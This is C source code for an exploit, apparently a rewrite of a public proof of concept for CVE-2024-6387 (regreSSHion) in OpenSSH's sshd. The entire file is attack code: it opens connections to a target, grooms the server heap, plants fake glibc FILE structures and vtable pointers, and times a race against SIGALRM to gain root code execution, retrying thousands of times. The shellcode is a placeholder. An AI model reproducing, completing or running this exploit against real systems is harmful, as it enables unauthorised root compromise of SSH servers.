/** regreSSHive.c
 * regreSSHive is a rewrite of the original 7etsuo's exploit 
 * for CVE-2024-6387 that just aim to fix some issues.
 * 
 * -------------------------------------------------------------------------
 * SSH-2.0-OpenSSH_9.2p1 Exploit
 * -------------------------------------------------------------------------
 *
 * Exploit Title  : SSH Exploit for CVE-2024-6387 (regreSSHion)
 * Author         : 7etsuo
 * Date           : 2024-07-01
 *
 * Description:
 * Targets a signal handler race condition in OpenSSH's
 * server (sshd) on glibc-based Linux systems. It exploits a vulnerability
 * where the SIGALRM handler calls async-signal-unsafe functions, leading
 * to rce as root.
 *
 * Notes:
 * 1. Shellcode        : Replace placeholder with actual payload.
 * 2. GLIBC_BASES      : Needs adjustment for specific target systems.
 * 3. Timing parameters: Fine-tune based on target system responsiveness.
 * 4. Heap layout      : Requires tweaking for different OpenSSH versions.
 * 5. File structure offsets: Verify for the specific glibc version.
 * -------------------------------------------------------------------------
*/

#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#include "regreSSHive.h"

// Possible glibc base addresses (for ASLR bypass)
uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 };
int NUM_GLIBC_BASES = sizeof(GLIBC_BASES) / sizeof(GLIBC_BASES[0]);

// init the connection with the target ssh server
int setup_connection(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        perror("socket");
        return -1;
    }

    struct sockaddr_in server_addr;

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    // setup server ip
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return -1;
    }

    // try to connect to the ssh server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    // Set socket to non-blocking mode
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    return sock;
}

// basic packet send to the ssh socket
void send_packet(
    int sock,
    unsigned char packet_type,
    const unsigned char *data,
    size_t len
) {
    unsigned char packet[MAX_PACKET_SIZE];
    size_t packet_len = len + 5;

    // encoding packet_len on 4 first byte
    // and packet_type on the fifth
    packet[0] = (packet_len >> 24) & 0xFF;
    packet[1] = (packet_len >> 16) & 0xFF;
    packet[2] = (packet_len >> 8) & 0xFF;
    packet[3] = packet_len & 0xFF;
    packet[4] = packet_type;

    memcpy(packet + 5, data, len); // writing data after ssh header

    if (send(sock, packet, packet_len, 0) < 0) perror("send_packet");
}

// sending the ssh version to the target server
void send_ssh_version(int sock) {
  const char *ssh_version = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n";

  if (send(sock, ssh_version, strlen(ssh_version), 0) < 0) perror("send ssh version");
}

// wait until ssh version received
int receive_ssh_version(int sock) {
    char buffer[256];
    ssize_t received;

    do received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    while(received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

    if (received > 0) {
        buffer[received] = '\0';
        printf("Received SSH version: %s", buffer);
        return 0;
    }
    else if (received == 0) fprintf(stderr, "Connection closed while receiving SSH version\n");
    else perror("receive ssh version");

    return -1;
}

// init the ssh key exchange
void send_kex_init(int sock) {
    unsigned char kexinit_payload[36] = { 0 };

    send_packet(sock, 20, kexinit_payload, sizeof(kexinit_payload));
}

// wait until key exchange received
int receive_kex_init(int sock) {
    unsigned char buffer[1024];
    ssize_t received;

    do received = recv(sock, buffer, sizeof(buffer), 0);
    while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

    if (received > 0) {
        printf("Received KEX_INIT (%zd bytes)\n", received);
        return 0;
    }
    else if (received == 0) fprintf(stderr, "Connection closed while receiving KEX_INIT\n");
    else perror ("receive kex init");

    return -1;
}

int perform_ssh_handshake(int sock) {
    send_ssh_version(sock);
    if (receive_ssh_version(sock) < 0) return -1;

    send_kex_init(sock);
    if (receive_kex_init(sock) < 0) return -1;

    return 0;
}

// prepare the server heap memory by sending packets
void prepare_heap(int sock) {
    // Packet a: Allocate and free tcache chunks
    for (int i = 0; i < 10; i++) {
        unsigned char tcache_chunk[64];
        memset(tcache_chunk, 'A', sizeof(tcache_chunk));
        send_packet(sock, 5, tcache_chunk, sizeof(tcache_chunk));
        // These will be freed by the server, populating tcache
    }

    // Packet b: Create 27 pairs of large (~8KB) and small (320B) holes
    for (int i = 0; i < 27; i++) { // NOTE: here only 6-7 pair sended without error on 9.6p1
        // Allocate large chunk (~8KB)
        unsigned char large_hole[8192];
        memset(large_hole, 'B', sizeof(large_hole));
        send_packet(sock, 5, large_hole, sizeof(large_hole));

        // Allocate small chunk (320B)
        unsigned char small_hole[320];
        memset(small_hole, 'C', sizeof(small_hole));
        send_packet(sock, 5, small_hole, sizeof(small_hole));
    }

    // Packet c: Write fake headers, footers, vtable and _codecvt pointers
    for (int i = 0; i < 27; i++) { // NOTE: every packets fail here on 9.6p1
        unsigned char fake_data[4096];
        create_fake_file_structure(fake_data, sizeof(fake_data), GLIBC_BASES[0]);
        send_packet(sock, 5, fake_data, sizeof(fake_data));
    }

    // Packet d: Ensure holes are in correct malloc bins (send ~256KB string)
    // NOTE: the packet will always fail on 9.6p1
    unsigned char large_string[MAX_PACKET_SIZE - 1];
    memset(large_string, 'E', sizeof(large_string));
    send_packet(sock, 5, large_string, sizeof(large_string));
}

// will fill data with fake headers, footers, vtable and _codecvt pointers
void create_fake_file_structure(unsigned char *data, size_t size, uint64_t glibc_base) {
    memset(data, 0, size);

    struct fake_file *ffile = (void *)data;

    // Set _vtable_offset to 0x61 as described in the advisory
    ffile->_vtable_offset = (void *)0x61;

    // Set up fake vtable and _codecvt pointers
    *(uint64_t *)(data + size - 16) = glibc_base + 0x21b740; // fake vtable (_IO_wfile_jumps)
    *(uint64_t *)(data + size - 8) = glibc_base + 0x21d7f8; // fake _codecvt
}

// get estimation of the time that will be taken by the ssh auth process
void time_final_packet(int sock, double *parsing_time) {
    double time_before = measure_response_time(sock, 1);
    double time_after = measure_response_time(sock, 2);
    *parsing_time = time_after - time_before;

    printf("Estimated parsing time: %.6f seconds\n", *parsing_time);
}

// will get the elapsed time while sending ssh error packets
double measure_response_time(int sock, int error_type) {
    unsigned char error_packet[1024];
    size_t packet_size;

    // Error before sshkey_from_blob
    if (error_type == 1) 
        packet_size = snprintf((char *)error_packet, sizeof(error_packet), "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3"); // write packet in error_packet
    
    // Error after sshkey_from_blob
    else
        packet_size = snprintf((char *)error_packet, sizeof(error_packet), "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9"); // write packet in error_packet

    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    send_packet(sock, 50, error_packet, packet_size); // SSH_MSG_USERAUTH_REQUEST

    char response[1024];
    ssize_t received;

    do received = recv(sock, response, sizeof(response), 0);
    while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

    clock_gettime(CLOCK_MONOTONIC, &end);

    double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;

    return elapsed;
}

// create the bufferoverflow exploit packet
void create_public_key_packet(
    unsigned char *packet, 
    size_t size, 
    uint64_t glibc_base, 
    unsigned char shellcode[]
) {
    memset(packet, 0, size);

    size_t offset = 0;
    for (int i = 0; i < 27; i++) {
        // malloc(~4KB) - This is for the large hole
        *(uint32_t *)(packet + offset) = CHUNK_ALIGN(4096);
        offset += CHUNK_ALIGN(4096);

        // malloc(304) - This is for the small hole (potential FILE structure)
        *(uint32_t *)(packet + offset) = CHUNK_ALIGN(304);
        offset += CHUNK_ALIGN(304);
    }

    // Add necessary headers for the SSH public key format
    memcpy(packet, "ssh-rsa ", 8);

    // Place shellcode in the heap via previous allocations
    memcpy(packet + CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13, shellcode, sizeof(shellcode));

    // Set up the fake FILE structures within the packet
    for (int i = 0; i < 27; i++) {
        create_fake_file_structure (
            packet + CHUNK_ALIGN(4096) * (i + 1) + CHUNK_ALIGN(304) * i,
            CHUNK_ALIGN(304),
            glibc_base
        );
    }
}

// most important function, will send the final packet,
// excepted the last byte, wait until 1ms before ssh SIGALRM
int attempt_race_condition(
    int sock,
    double parsing_time,
    uint64_t glibc_base,
    unsigned char shellcode[]
) {
    unsigned char final_packet[MAX_PACKET_SIZE];
    create_public_key_packet(final_packet, sizeof(final_packet), glibc_base, shellcode);

    // Send all but the last byte
    if (send(sock, final_packet, sizeof(final_packet) - 1, 0) < 0) {
        perror("send final packet");
        return 0;
    }

    // Precise timing for last byte
    struct timespec start, current;
    clock_gettime(CLOCK_MONOTONIC, &start);

    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &current);
        double elapsed = (current.tv_sec - start.tv_sec) + (current.tv_nsec - start.tv_nsec) / 1e9;

         // 1ms before SIGALRM
        if (elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001)) {
            if (send(sock, &final_packet[sizeof(final_packet) - 1], 1, 0) < 0) { // send last byte
                perror("send last byte");
                return 0;
            }

            break;
        }
    }

    // Check for successful exploitation
    char response[1024];
    ssize_t received = recv(sock, response, sizeof(response), 0);

    if (received > 0) {
        printf("Received response after exploit attempt (%zd bytes)\n", received);

        // Analyze response to determine if we hit the "large" race window
        if (memcmp(response, "SSH-2.0-", 8) != 0) {
            printf("Possible hit on 'large' race window\n");
            return 1;
        }

    } else if (received == 0) {
        printf("Connection closed by server - possible successful exploitation\n");
        return 1;

    } else if (errno == EWOULDBLOCK || errno == EAGAIN) {
        printf("No immediate response from server - possible successful exploitation\n");
        return 1;

    } else perror("recv");

    return 0;
}

// function to call for performing exploit (like main)
int perform_exploit(const char *ip, int port, unsigned char shellcode[]) {
    int success = 0;
    double parsing_time = 0;
    double timing_adjustment = 0;

    for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++) {
        uint64_t glibc_base = GLIBC_BASES[base_idx];
        printf("Attempting exploitation with glibc base: 0x%lx\n", glibc_base);

        for (int attempt = 0; attempt < 10000 && !success; attempt++) {
            if (attempt % 1000 == 0) printf("Attempt %d of 10000\n", attempt);

            // connection setup
            int sock = setup_connection(ip, port);
            if (sock < 0) {
                fprintf(stderr, "Failed to establish connection, attempt %d\n", attempt);
                continue;
            }

            // ssh handshake
            if (perform_ssh_handshake(sock) < 0) {
                fprintf(stderr, "SSH handshake failed, attempt %d\n", attempt);
                close(sock);
                continue;
            }

            // get server heap ready for exploit
            prepare_heap(sock);

            // get time for final packet
            time_final_packet(sock, &parsing_time);

            // Implement feedback-based timing strategy
            parsing_time += timing_adjustment;

            // final packet sending
            if (attempt_race_condition(sock, parsing_time, glibc_base, shellcode)) {
                printf("Possible exploitation success on attempt %d with glibc base 0x%lx!\n", attempt, glibc_base);
                success = 1;
                // In a real exploit, we would now attempt to interact with the
                // shell

            } else {
                // Adjust timing based on feedback
                timing_adjustment += 0.00001; // Small incremental adjustment
            }

            close(sock);
            usleep(100000); // 100ms delay between attempts, as mentioned in the advisory
        }
    }

    return success;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ip> <port>\n", argv[0]);
        exit(1);
    }

    unsigned char shellcode[] = "\x90\x90\x90\x90";

    const char *ip = argv[1];
    int port = atoi(argv[2]);

    return !perform_exploit(ip, port, shellcode);
}
